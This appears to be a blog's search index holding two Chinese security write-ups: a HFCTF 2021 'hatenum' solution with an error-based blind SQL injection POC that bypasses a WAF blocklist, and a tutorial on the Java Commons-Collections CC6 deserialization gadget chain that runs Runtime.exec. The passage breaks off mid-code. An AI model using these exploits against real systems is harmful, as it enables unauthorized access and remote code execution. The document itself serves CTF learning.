<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hatenum</title>
      <link href="/2025/04/05/%5BHFCTF%202021%20Final%5Dhatenum/"/>
      <url>/2025/04/05/%5BHFCTF%202021%20Final%5Dhatenum/</url>
      
        <content type="html"><![CDATA[<h1 id="HFCTF-2021-Final-hatenum-题解"><a href="#HFCTF-2021-Final-hatenum-题解" class="headerlink" title="[HFCTF 2021 Final]hatenum 题解"></a>[HFCTF 2021 Final]hatenum 题解</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$pass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;host,<span class="variable">$this</span>-&gt;user,<span class="variable">$this</span>-&gt;pass,<span class="variable">$this</span>-&gt;database);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;connect error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;insert into users (username,password,code) values (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$code</span>&#x27;)&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;conn-&gt;error)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$content</span>[<span class="string">&#x27;code&#x27;</span>]===<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$content</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_waf</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">array_waf</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">sql_waf</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">num_waf</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤分析"><a href="#过滤分析" class="headerlink" title="过滤分析"></a>过滤分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个sqlwaf基本上把能用的sql注入方法禁用了，他在登录时有三种情况，登录成功、登录失败和发生错误，这里可以用错误盲注</p><h3 id="exp函数"><a href="#exp函数" class="headerlink" title="exp函数"></a>exp函数</h3><p>1、MySQL中的exp()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数，exp()函数在sql注入里面exp函数一般被用做报错注入（mysql&lt;5.5.53）里面输出报错信息</p><p>2、这里注入利用的是Double溢出，exp(x) 含义为e的x次方，当x&gt;709时就超过了double的取值范围造成报错输出</p><p>3、我们可以用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 Double 数组范围，从而报错输出</p><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们来进行绕过关键字</p><p>盲注通常会用到以下几个关键字:</p><p>字符串截取类（substr）、条件判断类（if）、语句分割类（空格、&#x2F;**&#x2F;）、逻辑运算类（and、or）</p><h3 id="字符串截取类"><a href="#字符串截取类" class="headerlink" title="字符串截取类"></a><strong>字符串截取类</strong></h3><p>禁用：<code>substr、left、right、mid</code></p><p>绕过： <code>like、rlike、instr</code></p><p>其中like与rlike的区别是 rlike支持正则表达式，而like只支持如%，_等有限的通配符，like可以近似于”&#x3D;”</p><h3 id="语句分割"><a href="#语句分割" class="headerlink" title="语句分割"></a><strong>语句分割</strong></h3><p>禁用： 空格、r(%0d)、n(%0a)、t(%09)、&#x2F;**&#x2F;</p><p>语句之间分割常常使用空格</p><p>绕过： %a0（&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a><strong>逻辑运算</strong></h3><p>禁用： and、or、&#x3D;、&gt;、&lt;、regexp</p><p>绕过： &amp;&amp;、||、 like、greatest、least</p><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a><strong>条件判断</strong></h3><p>禁用： 因为禁用了,，所以if 语句没法使用</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="SQL语句拼接"><a href="#SQL语句拼接" class="headerlink" title="SQL语句拼接"></a>SQL语句拼接</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p>在过滤我们传入的数据后拼接到SQL语句当中，由于把单引号过滤了，这里无法使用单引号对其进行闭合，所以这里我们把<strong>username</strong>设置为\从而把后面的单引号取过来利用，然后把<strong>password</strong>设置成||1 &amp;&amp;()#</p><p>这样sql语句就变成了</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>’\’ <span class="keyword">and</span> password<span class="operator">=</span>’<span class="operator">||</span>if(....)#’;</span><br><span class="line">username<span class="operator">=</span> \’ <span class="keyword">and</span> password<span class="operator">=</span> </span><br></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>接下来就是在password后边的判断处注入我们的payload，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike <span class="subst">&#123;gethex(ch+a)&#125;</span>))#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="built_in">chr</span>(<span class="number">0x0b</span>))</span><br></pre></td></tr></table></figure><p>由于代码对数字进行的长度限制，这里我们只能三个三个的进行正则匹配，若匹配成功则回显fail，失败则是error</p><h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://40004396-7df7-41d5-970d-85741f792101.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">all_chr = string.ascii_letters + string.digits + <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># /union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i</span></span><br><span class="line"><span class="comment"># select * from users where username=&#x27;username&#x27; and password=&#x27;password&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethex</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">&#x27;0x&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">end = <span class="string">&quot;&quot;</span></span><br><span class="line">a=<span class="string">&quot;^&quot;</span><span class="comment"># 匹配前面部分</span></span><br><span class="line"><span class="comment">#a=&quot;$&quot;# 匹配后面部分</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> all_chr:</span><br><span class="line">        <span class="comment"># .replace(&#x27; &#x27;, chr(0x0b))或.replace(&#x27; &#x27;, chr(0x0c))都行</span></span><br><span class="line">        <span class="comment"># 匹配前面部分</span></span><br><span class="line">        payload = <span class="string">f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike <span class="subst">&#123;gethex(a + ch)&#125;</span>))#&quot;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x0b</span>))</span><br><span class="line">        <span class="comment"># 匹配后面部分</span></span><br><span class="line">        <span class="comment"># payload = f&quot;||1 &amp;&amp; username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike &#123;gethex(ch + a)&#125;))#&quot;.replace(&#x27; &#x27;, chr(0x0b))</span></span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;password&quot;</span>: payload, <span class="string">&quot;code&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        req = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fail&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            end += ch</span><br><span class="line">            <span class="built_in">print</span>(a+ch, end)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">3</span>:</span><br><span class="line">                a = a[<span class="number">1</span>:] + ch</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a += ch</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;||1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&quot;erghruigh2uygh23uiu32ig&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化CC6链</title>
      <link href="/2025/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/"/>
      <url>/2025/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h2><ul><li><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Jdk 8u71</a></p></li><li><p>Comoons-Collections 3.2.1</p></li></ul><h2 id="0x02-触发链过程"><a href="#0x02-触发链过程" class="headerlink" title="0x02 触发链过程"></a>0x02 触发链过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0X03-过程分析"><a href="#0X03-过程分析" class="headerlink" title="0X03 过程分析"></a>0X03 过程分析</h2><p>CC6链我们主要分析从readObject到LazyMap的get函数，这之后触发的链子可变化的样式较多。</p><h3 id="第一步：LazyMap-transform"><a href="#第一步：LazyMap-transform" class="headerlink" title="第一步：LazyMap-&gt;transform"></a>第一步：LazyMap-&gt;transform</h3><p><img src="/./../img/JavaCc/CC6-1.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在LazyMap类中的get()方法调用了transform</p><p>并且可以通过decorate方法给factory赋值</p><p><img src="/./../img/JavaCc/CC6-2.png"></p><h3 id="第二步：TiedMapEntry-get"><a href="#第二步：TiedMapEntry-get" class="headerlink" title="第二步：TiedMapEntry-&gt;get()"></a>第二步：TiedMapEntry-&gt;get()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在TiedMapEntry中的getValue方法调用了get并且hashCode方法又调用了getValue,所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), ct);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        entry.hashCode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="第三步：hashMap"><a href="#第三步：hashMap" class="headerlink" title="第三步：hashMap"></a>第三步：hashMap</h3><p>之前在URLDNS反序列化链当中提到了hashMap的readObject可以会触发hashCode方法，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要给hashMap传入TiedMapEntry这个key就能让他触发链子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), ct);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(entry, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里触发链子是因为put函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他会执行hash方法然后hashcode所以这一步是需要调整的，不然在序列化之前他就已经执行了链子</p><h2 id="第三步：调整利用链"><a href="#第三步：调整利用链" class="headerlink" title="第三步：调整利用链"></a>第三步：调整利用链</h2><p>由于HashMap的put方法会导致提前调用hash方法，从而在序列化前就命令执行，所以这里修改一下代码。</p><p>这里选择在新建LazyMap对象的时候，随便传入一个Transformer对象，等put完之后再通过反射修改回ChainedTransformer对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(entry, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; clazz = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap, ct);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是运行发现这样无法弹出计算器，原因出在LazyMap的get方法处，由于put函数会先触发一次hashCode到get</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span 